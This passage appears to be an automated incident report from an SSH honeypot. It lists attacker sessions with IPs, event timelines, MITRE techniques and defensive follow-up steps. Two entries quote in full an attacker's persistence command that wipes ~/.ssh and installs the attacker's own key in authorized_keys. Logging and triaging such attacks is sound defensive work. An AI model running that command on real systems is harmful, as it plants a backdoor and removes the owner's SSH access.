| `2026-07-09 09:51:20` | `cowrie.client.version` |
| `2026-07-09 09:51:20` | `cowrie.client.kex` |
| `2026-07-09 09:51:26` | `cowrie.login.success` |
| `2026-07-09 09:51:29` | `cowrie.session.params` |
| `2026-07-09 09:51:29` | `cowrie.command.input` |
| `2026-07-09 09:51:30` | `cowrie.log.closed` |
| `2026-07-09 09:51:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc59ef52a980

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 09:52 |
| **Last Seen** | 2026-07-09 09:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:52:11` | `cowrie.session.connect` |
| `2026-07-09 09:52:11` | `cowrie.client.version` |
| `2026-07-09 09:52:11` | `cowrie.client.kex` |
| `2026-07-09 09:52:12` | `cowrie.login.success` |
| `2026-07-09 09:52:12` | `cowrie.session.params` |
| `2026-07-09 09:52:12` | `cowrie.command.input` |
| `2026-07-09 09:52:12` | `cowrie.log.closed` |
| `2026-07-09 09:52:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9910e6e7915

| Field | Detail |
|---|---|
| **Source IP** | `14.1.65[.]89` |
| **First Seen** | 2026-07-09 09:54 |
| **Last Seen** | 2026-07-09 10:00 |
| **Session Duration** | 305s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:54:57` | `cowrie.session.connect` |
| `2026-07-09 09:54:59` | `cowrie.client.version` |
| `2026-07-09 09:54:59` | `cowrie.client.kex` |
| `2026-07-09 09:55:02` | `cowrie.login.success` |
| `2026-07-09 09:55:03` | `cowrie.direct-tcpip.request` |
| `2026-07-09 10:00:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.1.65[.]89` to AbuseIPDB if not already reported
- [ ] Block `14.1.65[.]89` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c22ad9f2ac1

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]136` |
| **First Seen** | 2026-07-09 09:55 |
| **Last Seen** | 2026-07-09 09:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:55:08` | `cowrie.session.connect` |
| `2026-07-09 09:55:09` | `cowrie.client.version` |
| `2026-07-09 09:55:09` | `cowrie.client.kex` |
| `2026-07-09 09:55:10` | `cowrie.login.success` |
| `2026-07-09 09:55:10` | `cowrie.direct-tcpip.request` |
| `2026-07-09 09:55:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]136` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2605b6b7c675

| Field | Detail |
|---|---|
| **Source IP** | `62.183.82[.]70` |
| **First Seen** | 2026-07-09 09:56 |
| **Last Seen** | 2026-07-09 09:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:56:49` | `cowrie.session.connect` |
| `2026-07-09 09:56:49` | `cowrie.client.version` |
| `2026-07-09 09:56:49` | `cowrie.client.kex` |
| `2026-07-09 09:56:51` | `cowrie.login.success` |
| `2026-07-09 09:56:51` | `cowrie.direct-tcpip.request` |
| `2026-07-09 09:56:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.183.82[.]70` to AbuseIPDB if not already reported
- [ ] Block `62.183.82[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-607b79a8927f

| Field | Detail |
|---|---|
| **Source IP** | `65.20.131[.]63` |
| **First Seen** | 2026-07-09 09:59 |
| **Last Seen** | 2026-07-09 10:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:59:59` | `cowrie.session.connect` |
| `2026-07-09 09:59:59` | `cowrie.client.version` |
| `2026-07-09 09:59:59` | `cowrie.client.kex` |
| `2026-07-09 10:00:01` | `cowrie.login.success` |
| `2026-07-09 10:00:01` | `cowrie.direct-tcpip.request` |
| `2026-07-09 10:00:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.131[.]63` to AbuseIPDB if not already reported
- [ ] Block `65.20.131[.]63` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12502b694e9d

| Field | Detail |
|---|---|
| **Source IP** | `115.140.161[.]61` |
| **First Seen** | 2026-07-09 10:00 |
| **Last Seen** | 2026-07-09 10:01 |
| **Session Duration** | 47s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:00:36` | `cowrie.session.connect` |
| `2026-07-09 10:00:36` | `cowrie.client.version` |
| `2026-07-09 10:00:36` | `cowrie.client.kex` |
| `2026-07-09 10:00:37` | `cowrie.login.failed` |
| `2026-07-09 10:00:38` | `cowrie.login.success` |
| `2026-07-09 10:00:39` | `cowrie.session.params` |
| `2026-07-09 10:00:39` | `cowrie.command.input` |
| `2026-07-09 10:00:39` | `cowrie.command.failed` |
| `2026-07-09 10:00:39` | `cowrie.log.closed` |
| `2026-07-09 10:00:40` | `cowrie.session.params` |
| `2026-07-09 10:00:40` | `cowrie.command.input` |
| `2026-07-09 10:00:41` | `cowrie.log.closed` |
| `2026-07-09 10:00:41` | `cowrie.session.params` |
| `2026-07-09 10:00:41` | `cowrie.command.input` |
| `2026-07-09 10:00:42` | `cowrie.log.closed` |
| `2026-07-09 10:00:43` | `cowrie.session.params` |
| `2026-07-09 10:00:43` | `cowrie.command.input` |
| `2026-07-09 10:00:43` | `cowrie.log.closed` |
| `2026-07-09 10:00:44` | `cowrie.session.params` |
| `2026-07-09 10:00:44` | `cowrie.command.input` |
| `2026-07-09 10:00:44` | `cowrie.log.closed` |
| `2026-07-09 10:00:45` | `cowrie.session.params` |
| `2026-07-09 10:00:45` | `cowrie.command.input` |
| `2026-07-09 10:00:45` | `cowrie.log.closed` |
| `2026-07-09 10:00:46` | `cowrie.session.params` |
| `2026-07-09 10:00:46` | `cowrie.command.input` |
| `2026-07-09 10:00:47` | `cowrie.log.closed` |
| `2026-07-09 10:00:48` | `cowrie.session.params` |
| `2026-07-09 10:00:48` | `cowrie.command.input` |
| `2026-07-09 10:00:48` | `cowrie.log.closed` |
| `2026-07-09 10:00:49` | `cowrie.session.params` |
| `2026-07-09 10:00:49` | `cowrie.command.input` |
| `2026-07-09 10:00:49` | `cowrie.log.closed` |
| `2026-07-09 10:01:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.140.161[.]61` to AbuseIPDB if not already reported
- [ ] Block `115.140.161[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-810a7754528b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 10:02 |
| **Last Seen** | 2026-07-09 10:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:02:49` | `cowrie.session.connect` |
| `2026-07-09 10:02:49` | `cowrie.client.version` |
| `2026-07-09 10:02:49` | `cowrie.client.kex` |
| `2026-07-09 10:02:50` | `cowrie.login.success` |
| `2026-07-09 10:02:51` | `cowrie.session.params` |
| `2026-07-09 10:02:51` | `cowrie.command.input` |
| `2026-07-09 10:02:51` | `cowrie.log.closed` |
| `2026-07-09 10:02:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daa21dfe28f7

| Field | Detail |
|---|---|
| **Source IP** | `75.80.65[.]214` |
| **First Seen** | 2026-07-09 10:07 |
| **Last Seen** | 2026-07-09 10:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:07:23` | `cowrie.session.connect` |
| `2026-07-09 10:07:24` | `cowrie.client.version` |
| `2026-07-09 10:07:24` | `cowrie.client.kex` |
| `2026-07-09 10:07:26` | `cowrie.login.success` |
| `2026-07-09 10:07:27` | `cowrie.direct-tcpip.request` |
| `2026-07-09 10:07:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `75.80.65[.]214` to AbuseIPDB if not already reported
- [ ] Block `75.80.65[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da2753f3dd27

| Field | Detail |
|---|---|
| **Source IP** | `88.255.189[.]44` |
| **First Seen** | 2026-07-09 10:07 |
| **Last Seen** | 2026-07-09 10:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:07:37` | `cowrie.session.connect` |
| `2026-07-09 10:07:38` | `cowrie.client.version` |
| `2026-07-09 10:07:38` | `cowrie.client.kex` |
| `2026-07-09 10:07:39` | `cowrie.login.success` |
| `2026-07-09 10:07:40` | `cowrie.direct-tcpip.request` |
| `2026-07-09 10:07:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.255.189[.]44` to AbuseIPDB if not already reported
- [ ] Block `88.255.189[.]44` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d9f7265e56b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 10:08 |
| **Last Seen** | 2026-07-09 10:08 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:08:27` | `cowrie.session.connect` |
| `2026-07-09 10:08:28` | `cowrie.client.version` |
| `2026-07-09 10:08:28` | `cowrie.client.kex` |
| `2026-07-09 10:08:34` | `cowrie.login.success` |
| `2026-07-09 10:08:37` | `cowrie.session.params` |
| `2026-07-09 10:08:37` | `cowrie.command.input` |
| `2026-07-09 10:08:38` | `cowrie.log.closed` |
| `2026-07-09 10:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a17694e9d63

| Field | Detail |
|---|---|
| **Source IP** | `59.93.36[.]136` |
| **First Seen** | 2026-07-09 10:10 |
| **Last Seen** | 2026-07-09 10:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:10:33` | `cowrie.session.connect` |
| `2026-07-09 10:10:34` | `cowrie.client.version` |
| `2026-07-09 10:10:34` | `cowrie.client.kex` |
| `2026-07-09 10:10:36` | `cowrie.login.success` |
| `2026-07-09 10:10:37` | `cowrie.direct-tcpip.request` |
| `2026-07-09 10:10:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.93.36[.]136` to AbuseIPDB if not already reported
- [ ] Block `59.93.36[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4d7f5e97053

| Field | Detail |
|---|---|
| **Source IP** | `200.106.49[.]149` |
| **First Seen** | 2026-07-09 10:10 |
| **Last Seen** | 2026-07-09 10:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:10:42` | `cowrie.session.connect` |
| `2026-07-09 10:10:43` | `cowrie.client.version` |
| `2026-07-09 10:10:43` | `cowrie.client.kex` |
| `2026-07-09 10:10:44` | `cowrie.login.success` |
| `2026-07-09 10:10:45` | `cowrie.direct-tcpip.request` |
| `2026-07-09 10:10:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.106.49[.]149` to AbuseIPDB if not already reported
- [ ] Block `200.106.49[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11e938826f1a

| Field | Detail |
|---|---|
| **Source IP** | `114.111.52[.]109` |
| **First Seen** | 2026-07-09 10:12 |
| **Last Seen** | 2026-07-09 10:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:12:25` | `cowrie.session.connect` |
| `2026-07-09 10:12:25` | `cowrie.client.version` |
| `2026-07-09 10:12:26` | `cowrie.client.kex` |
| `2026-07-09 10:12:26` | `cowrie.login.success` |
| `2026-07-09 10:12:27` | `cowrie.session.params` |
| `2026-07-09 10:12:27` | `cowrie.command.input` |
| `2026-07-09 10:12:27` | `cowrie.command.failed` |
| `2026-07-09 10:12:28` | `cowrie.log.closed` |
| `2026-07-09 10:12:29` | `cowrie.session.params` |
| `2026-07-09 10:12:29` | `cowrie.command.input` |
| `2026-07-09 10:12:29` | `cowrie.session.file_download` |
| `2026-07-09 10:12:29` | `cowrie.log.closed` |
| `2026-07-09 10:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.111.52[.]109` to AbuseIPDB if not already reported
- [ ] Block `114.111.52[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6709e0c66cf5

| Field | Detail |
|---|---|
| **Source IP** | `114.111.52[.]109` |
| **First Seen** | 2026-07-09 10:12 |
| **Last Seen** | 2026-07-09 10:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:12:29` | `cowrie.session.connect` |
| `2026-07-09 10:12:29` | `cowrie.client.version` |
| `2026-07-09 10:12:29` | `cowrie.client.kex` |
| `2026-07-09 10:12:30` | `cowrie.login.success` |
| `2026-07-09 10:12:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.111.52[.]109` to AbuseIPDB if not already reported
- [ ] Block `114.111.52[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1169bc0229c

| Field | Detail |
|---|---|
| **Source IP** | `114.111.52[.]109` |
| **First Seen** | 2026-07-09 10:12 |
| **Last Seen** | 2026-07-09 10:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:12:31` | `cowrie.session.connect` |
| `2026-07-09 10:12:31` | `cowrie.client.version` |
| `2026-07-09 10:12:31` | `cowrie.client.kex` |
| `2026-07-09 10:12:32` | `cowrie.login.success` |
| `2026-07-09 10:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.111.52[.]109` to AbuseIPDB if not already reported
- [ ] Block `114.111.52[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a594100e34cd

| Field | Detail |
|---|---|
| **Source IP** | `222.232.176[.]7` |
| **First Seen** | 2026-07-09 10:17 |
| **Last Seen** | 2026-07-09 10:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:17:03` | `cowrie.session.connect` |
| `2026-07-09 10:17:03` | `cowrie.client.version` |
| `2026-07-09 10:17:03` | `cowrie.client.kex` |
| `2026-07-09 10:17:04` | `cowrie.login.success` |
| `2026-07-09 10:17:05` | `cowrie.session.params` |
| `2026-07-09 10:17:05` | `cowrie.command.input` |
| `2026-07-09 10:17:05` | `cowrie.command.failed` |
| `2026-07-09 10:17:05` | `cowrie.log.closed` |
| `2026-07-09 10:17:06` | `cowrie.session.params` |
| `2026-07-09 10:17:06` | `cowrie.command.input` |
| `2026-07-09 10:17:06` | `cowrie.session.file_download` |
| `2026-07-09 10:17:06` | `cowrie.log.closed` |
| `2026-07-09 10:17:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.232.176[.]7` to AbuseIPDB if not already reported
- [ ] Block `222.232.176[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ce635d0b969

| Field | Detail |
|---|---|
| **Source IP** | `222.232.176[.]7` |
| **First Seen** | 2026-07-09 10:17 |
| **Last Seen** | 2026-07-09 10:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:17:06` | `cowrie.session.connect` |
| `2026-07-09 10:17:06` | `cowrie.client.version` |
| `2026-07-09 10:17:07` | `cowrie.client.kex` |
| `2026-07-09 10:17:07` | `cowrie.login.success` |
| `2026-07-09 10:17:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.232.176[.]7` to AbuseIPDB if not already reported
- [ ] Block `222.232.176[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3154766bb531

| Field | Detail |
|---|---|
| **Source IP** | `222.232.176[.]7` |
| **First Seen** | 2026-07-09 10:17 |
| **Last Seen** | 2026-07-09 10:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:17:08` | `cowrie.session.connect` |
| `2026-07-09 10:17:08` | `cowrie.client.version` |
| `2026-07-09 10:17:08` | `cowrie.client.kex` |
| `2026-07-09 10:17:09` | `cowrie.login.success` |
| `2026-07-09 10:17:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.232.176[.]7` to AbuseIPDB if not already reported
- [ ] Block `222.232.176[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69c8ab863af2

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 10:18 |
| **Last Seen** | 2026-07-09 10:19 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:18:55` | `cowrie.session.connect` |
| `2026-07-09 10:18:58` | `cowrie.client.version` |
| `2026-07-09 10:18:58` | `cowrie.client.kex` |
| `2026-07-09 10:19:03` | `cowrie.login.success` |
| `2026-07-09 10:19:06` | `cowrie.session.params` |
| `2026-07-09 10:19:06` | `cowrie.command.input` |
| `2026-07-09 10:19:08` | `cowrie.log.closed` |
| `2026-07-09 10:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44678cdd07fc

| Field | Detail |
|---|---|
| **Source IP** | `182.76.71[.]82` |
| **First Seen** | 2026-07-09 10:19 |
| **Last Seen** | 2026-07-09 10:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:19:09` | `cowrie.session.connect` |
| `2026-07-09 10:19:10` | `cowrie.client.version` |
| `2026-07-09 10:19:10` | `cowrie.client.kex` |
| `2026-07-09 10:19:12` | `cowrie.login.success` |
| `2026-07-09 10:19:12` | `cowrie.direct-tcpip.request` |
| `2026-07-09 10:19:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.71[.]82` to AbuseIPDB if not already reported
- [ ] Block `182.76.71[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0880e70642a6

| Field | Detail |
|---|---|
| **Source IP** | `165.232.174[.]146` |
| **First Seen** | 2026-07-09 10:20 |
| **Last Seen** | 2026-07-09 10:20 |
| **Session Duration** | 43s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:20:05` | `cowrie.session.connect` |
| `2026-07-09 10:20:09` | `cowrie.client.version` |
| `2026-07-09 10:20:09` | `cowrie.client.kex` |
| `2026-07-09 10:20:31` | `cowrie.login.success` |
| `2026-07-09 10:20:41` | `cowrie.session.params` |
| `2026-07-09 10:20:41` | `cowrie.command.input` |
| `2026-07-09 10:20:48` | `cowrie.log.closed` |
| `2026-07-09 10:20:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.174[.]146` to AbuseIPDB if not already reported
- [ ] Block `165.232.174[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77e0dffff07c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 10:24 |
| **Last Seen** | 2026-07-09 10:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:24:00` | `cowrie.session.connect` |
| `2026-07-09 10:24:00` | `cowrie.client.version` |
| `2026-07-09 10:24:00` | `cowrie.client.kex` |
| `2026-07-09 10:24:00` | `cowrie.login.success` |
| `2026-07-09 10:24:01` | `cowrie.session.params` |
| `2026-07-09 10:24:01` | `cowrie.command.input` |
| `2026-07-09 10:24:01` | `cowrie.log.closed` |
| `2026-07-09 10:24:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f059e4b84da2

| Field | Detail |
|---|---|
| **Source IP** | `117.250.19[.]91` |
| **First Seen** | 2026-07-09 10:25 |
| **Last Seen** | 2026-07-09 10:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
